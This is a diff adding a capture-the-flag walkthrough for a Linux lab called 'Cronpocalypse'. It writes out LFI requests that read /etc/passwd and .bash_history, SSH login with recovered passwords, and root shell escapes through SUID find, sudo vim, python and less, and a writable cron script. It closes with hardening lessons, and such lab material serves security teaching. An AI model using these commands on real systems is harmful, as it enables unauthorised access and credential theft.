@@ -426,3 +426,376 @@ Note: Unnecessary use of -X or --request, POST is already inferred.
 ```
 
 ---
+
+# Cronpocalypse — Linux Privilege Escalation Walkthrough
+
+## Overview
+
+The Cronpocalypse lab is an easy-level Linux privilege escalation challenge focused on:
+
+- Local File Inclusion (LFI)
+- Credential discovery
+- SSH access
+- Misconfigured cron jobs
+- SUID privilege escalation
+
+Goal:
+
+- Retrieve `flag-user.txt`
+- Retrieve `flag-root.txt`
+
+---
+
+# Step 1 — Exploit Local File Inclusion (LFI)
+
+The target web application exposes a vulnerable file-reading endpoint.
+
+## Test for LFI
+
+Try:
+
+```bash
+curl "http://<TARGET_IP>/read?file=/etc/passwd"
+```
+
+If `file` does not work, try common alternatives:
+
+```text
+path
+filename
+page
+doc
+```
+
+Example:
+
+```bash
+curl "http://<TARGET_IP>/read?page=/etc/passwd"
+```
+
+---
+
+## Identify Valid Users
+
+Look for users with interactive shells:
+
+```text
+ctf:x:1001:1001::/home/ctf:/bin/bash
+```
+
+The important fields are:
+
+- Username: `ctf`
+- Home directory: `/home/ctf`
+- Shell: `/bin/bash`
+
+---
+
+# Step 2 — Retrieve Credentials
+
+Read the shell history file:
+
+```bash
+curl "http://<TARGET_IP>/read?file=/home/ctf/.bash_history"
+```
+
+Look for:
+
+- SSH logins
+- `su` commands
+- MySQL credentials
+- Hardcoded passwords
+
+Example:
+
+```text
+ssh ctf@localhost
+su -
+Password: s3cr3tpassword123
+```
+
+Or:
+
+```text
+mysql -u root -pSuperSecretPassword
+```
+
+---
+
+# Step 3 — SSH Access
+
+Use the discovered credentials:
+
+```bash
+ssh ctf@<TARGET_IP>
+```
+
+Enter the recovered password.
+
+---
+
+# Step 4 — Retrieve User Flag
+
+Once logged in:
+
+```bash
+cat ~/flag-user.txt
+```
+
+Example output:
+
+```text
+flag{user_flag_here}
+```
+
+---
+
+# Step 5 — Enumerate for Privilege Escalation
+
+## Check Sudo Permissions
+
+```bash
+sudo -l
+```
+
+Look for commands runnable as root.
+
+Example:
+
+```text
+(root) NOPASSWD: /usr/bin/find
+```
+
+---
+
+## Check SUID Binaries
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+
+Interesting binaries include:
+
+```text
+/usr/bin/find
+/usr/bin/vim
+/usr/bin/python3
+```
+
+---
+
+## Check Cron Jobs
+
+```bash
+cat /etc/crontab
+```
+
+```bash
+ls -la /etc/cron*
+```
+
+```bash
+crontab -l
+```
+
+---
+
+## Search for Writable Files
+
+```bash
+find / -writable -type f 2>/dev/null | grep -v proc
+```
+
+Check especially for:
+
+- Writable scripts
+- Root-owned cron scripts
+- Files executed automatically
+
+---
+
+# Step 6 — Exploitation
+
+---
+
+## Method 1 — Exploit SUID `find`
+
+If `find` is SUID:
+
+```bash
+find /tmp -exec /bin/sh \; -quit
+```
+
+Verify root:
+
+```bash
+whoami
+```
+
+Expected:
+
+```text
+root
+```
+
+---
+
+## Method 2 — Exploit Writable Cron Script
+
+Suppose root runs:
+
+```text
+/opt/cleanup.sh
+```
+
+Check permissions:
+
+```bash
+ls -la /opt/cleanup.sh
+```
+
+If writable:
+
+```bash
+echo 'cp /root/flag-root.txt /tmp/flag-root.txt && chmod 777 /tmp/flag-root.txt' >> /opt/cleanup.sh
+```
+
+Wait approximately one minute for cron execution.
+
+Retrieve the flag:
+
+```bash
+cat /tmp/flag-root.txt
+```
+
+---
+
+## Method 3 — Exploit `sudo`
+
+### Vim
+
+```bash
+sudo vim -c ':!/bin/sh'
+```
+
+---
+
+### Python
+
+```bash
+sudo python3 -c 'import os; os.system("/bin/sh")'
+```
+
+---
+
+### Less
+
+```bash
+sudo less /etc/passwd
+```
+
+Then type:
+
+```text
+!sh
+```
+
+---
+
+# Step 7 — Retrieve Root Flag
+
+Once root access is obtained:
+
+```bash
+cat /root/flag-root.txt
+```
+
+Example:
+
+```text
+flag{root_flag_here}
+```
+
+---
+
+# Quick Reference Table
+
+| Step | Command | Goal |
+|---|---|---|
+| LFI | `curl "http://IP/read?file=/etc/passwd"` | Identify users |
+| Credentials | `curl "http://IP/read?file=/home/ctf/.bash_history"` | Recover passwords |
+| SSH | `ssh ctf@IP` | Gain shell |
+| User Flag | `cat ~/flag-user.txt` | Retrieve user flag |
+| Enumeration | `sudo -l` | Identify sudo misconfigurations |
+| Enumeration | `find / -perm -4000 -type f 2>/dev/null` | Find SUID binaries |
+| Enumeration | `cat /etc/crontab` | Check cron jobs |
+| Root Flag | `cat /root/flag-root.txt` | Retrieve root flag |
+
+---
+
+# Key Lessons
+
+## Local File Inclusion (LFI)
+
+Improper file path validation allows attackers to read arbitrary files.
+
+Examples:
+
+- `/etc/passwd`
+- `.bash_history`
+- configuration files
+- SSH keys
+
+---
+
+## Credential Hygiene
+
+Sensitive credentials should never appear in:
+
+- shell history
+- scripts
+- plaintext files
+
+---
+
+## Least Privilege
+
+Misconfigured:
+
+- cron jobs
+- SUID binaries
+- sudo permissions
+
+can lead directly to full system compromise.
+
+---
+
+# Useful Enumeration Commands
+
+```bash
+id
+whoami
+hostname
+uname -a
+sudo -l
+find / -perm -4000 -type f 2>/dev/null
+cat /etc/crontab
+ls -la /etc/cron*
+find / -writable -type f 2>/dev/null
+```
+
+---
+
+# Conclusion
+
+Cronpocalypse demonstrates how small Linux misconfigurations can chain together into full privilege escalation:
+
+1. LFI exposure
+2. Credential leakage
+3. SSH access
+4. Misconfigured privilege mechanisms
+5. Root compromise
+
+Understanding these attack paths is essential for both offensive security testing and defensive hardening.
+
+---
